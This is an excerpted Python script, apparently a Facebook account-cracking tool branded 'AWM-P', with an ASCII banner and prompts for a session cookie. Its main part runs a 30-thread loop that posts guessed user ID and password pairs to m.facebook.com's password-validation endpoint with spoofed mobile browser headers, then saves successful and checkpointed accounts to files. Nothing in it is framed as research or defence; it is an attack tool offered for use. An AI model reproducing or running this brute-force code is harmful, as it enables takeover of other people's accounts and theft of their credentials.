...
def uaku():
	try:
		...
		a=requests.get('https://raw.githubusercontent.com/BestProfessionals/Professionals/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
...
#------------------[ LOGO-BANNER ]-----------------#
def banner():
	print(f"""\033[1;91m     I am Afghan, I am Muslim   (Willcome To The Dark) \n
\033[1;90m                  db    Yb        dP  8b   d8 
\033[1;91m                 dPYb    Yb  db  dP   8YbmdP8 
\033[1;93m                dPwwYb    YbdPYbdP    8  "  8    
\033[1;92m               dP    Yb    YP  YP     8     8 

\033[1;32m              \033[1;36mCREATED BY\33[0;m   :  \033[1;31mA.W.M\33[0;m\033[1;30m Pro \033[1;33mTeam\33[0;m
\033[1;32m              \033[1;35mGITHUB       :  \033[1;39mDanishyar
\033[1;32m              \033[1;34mSTATUS       :  \033[1;32mPermium
\033[1;32m              \033[1;33mVIRSION      :  \033[1;36m2.0
...
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(nel('\tCookies Pest Here (Respect Bro...) : [green]Cookie[white]'))
...
def passwrd():
	print('')
	print(f'>> AWM-P {h}OK{x} Save in : {h}OK/%s {x}'%(okc))
	print(f'>> AWM-P {k}CP{x} Save in : {k}CP/%s {x}'%(cpc))
	...
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			if 'mobile' in method:
				...
				pool.submit(crack,idf,pwv)
	print('')
	cetak('\t[cyan]>>[green] Succesfully Crack,Dont Forget Send Request For me before Use My Script [cyan] <<[white] ')
	print(f'{h} OK : {h}%s '%(ok))
	...
	if woi in ['y','Y']:
		...
		print(f'\t{x}>>{k} Thanks To Using My Script {x} << ')
		time.sleep(2)
		back()
#--------------------[ METODE-MOBILE ]-----------------#
def crack(idf,pwv):
	...
	ua2 = 'Mozilla/5.0 (Linux; Android 10; SO-04H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36'
	ses = requests.Session()
	for pw in pwv:
		try:
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login/device-based/async/?refsrc=deprecated&amp')
			...
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="104"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/async/?refsrc=deprecated&amp','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{b}AWM-CP {M}{K}{idf}|{pw}{N}\n└── {x}User Agent{x} : {x} {M}{ua}{M}')
